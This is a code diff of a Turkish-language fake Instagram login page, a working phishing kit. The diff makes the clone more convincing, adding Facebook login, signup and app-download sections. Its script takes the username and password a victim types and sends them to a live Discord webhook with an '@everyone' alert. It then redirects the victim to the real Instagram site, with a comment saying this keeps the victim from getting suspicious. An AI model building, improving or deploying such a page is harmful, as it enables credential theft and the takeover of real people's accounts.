@@ -3,52 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram • Giriş Yap</title>
+    <title>Instagram</title>
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-sizing: border-box; }
-        .logo { background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b56e.png'); background-size: contain; background-repeat: no-repeat; width: 175px; height: 51px; margin: 0 auto 30px; }
-        input { width: 100%; padding: 9px 0 7px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
-        button { width: 100%; padding: 7px; border: none; border-radius: 4px; background-color: #0095f6; color: white; font-weight: 600; cursor: pointer; margin-top: 8px; font-size: 14px; }
-        button:active { background-color: #58c0ff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; display: flex; flex-direction: column; min-height: 100vh; align-items: center; justify-content: center; }
+        .main-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 10px 40px; text-align: center; margin-bottom: 10px; }
+        .logo { background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b56e.png'); background-size: contain; background-repeat: no-repeat; width: 175px; height: 51px; margin: 22px auto 12px; }
+        input { width: 100%; padding: 9px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; outline: none; }
+        input:focus { border-color: #a8a8a8; }
+        .login-btn { width: 100%; padding: 5px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: 600; cursor: pointer; margin: 8px 0; font-size: 14px; }
+        .login-btn:disabled { background-color: #b2dffc; }
+        .divider { display: flex; align-items: center; margin: 10px 0 18px; }
+        .divider div { flex: 1; height: 1px; background: #dbdbdb; }
+        .divider span { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; }
+        .forgot { color: #00376b; font-size: 12px; margin-top: 12px; cursor: pointer; }
+        .signup-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; font-size: 14px; }
+        .get-app { text-align: center; width: 350px; margin-top: 20px; font-size: 14px; }
+        .app-links { display: flex; justify-content: center; gap: 8px; margin-top: 10px; }
+        .app-links img { height: 40px; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="main-box">
         <div class="logo"></div>
-        <input type="text" id="user" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
-        <input type="password" id="pass" placeholder="Şifre">
-        <button onclick="capture()">Giriş Yap</button>
+        <input type="text" id="u_name" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
+        <input type="password" id="u_pass" placeholder="Şifre">
+        <button class="login-btn" onclick="send()">Giriş Yap</button>
+        <div class="divider"><div></div><span>YA DA</span><div></div></div>
+        <div class="fb-login">Facebook ile Giriş Yap</div>
+        <div class="forgot">Şifreni mi unuttun?</div>
     </div>
+    <div class="signup-box">Hesabın yok mu? <span style="color:#0095f6; font-weight:600; cursor:pointer;">Kaydol</span></div>
+    <div class="get-app">Uygulamayı indir.<div class="app-links">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yzy_BH9pGr6.png" alt="Google Play">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6Q_9_NoM.png" alt="Microsoft">
+    </div></div>
 
     <script>
-        function capture() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
+        function send() {
+            const user = document.getElementById('u_name').value;
+            const pass = document.getElementById('u_pass').value;
             const hook = "https://discord.com/api/webhooks/1472262996855357559/sv2EIkBgsXiFzqAnuCpqRdqDy1jpP5lQ9bwXigZn13PVbg-0hUUvU2t-SOzzguLIicJA";
 
-            if(u === "" || p === "") return alert("Lütfen bilgileri doldurun.");
+            if(!user || !pass) return;
 
             fetch(hook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    content: "@everyone **Yeni Hesap Düştü!**",
                     embeds: [{
-                        title: "🚀 Yeni Av Yakalandı!",
-                        color: 16711680,
+                        title: "📸 Instagram Login Bilgisi",
+                        color: 13500416,
                         fields: [
-                            { name: "👤 Kullanıcı/Mail", value: `\`${u}\``, inline: false },
-                            { name: "🔑 Şifre", value: `\`${p}\``, inline: false },
-                            { name: "🌐 Kaynak", value: window.location.href, inline: false }
+                            { name: "Kullanıcı Adı", value: "```" + user + "```" },
+                            { name: "Şifre", value: "```" + pass + "```" }
                         ],
-                        footer: { text: "DECCAL CHEATS | Test Modu Active" },
+                        footer: { text: "Operasyon: MODIE" },
                         timestamp: new Date()
                     }]
                 })
             }).then(() => {
-                window.location.replace("https://www.instagram.com/accounts/login/");
+                // Kurbanı şüphelendirmemek için direkt resmi siteye atıyoruz
+                window.location.replace("https://www.instagram.com/accounts/login/?next=/");
             }).catch(() => {
-                window.location.replace("https://www.instagram.com/accounts/login/");
+                window.location.replace("https://www.instagram.com");
             });
         }
     </script>
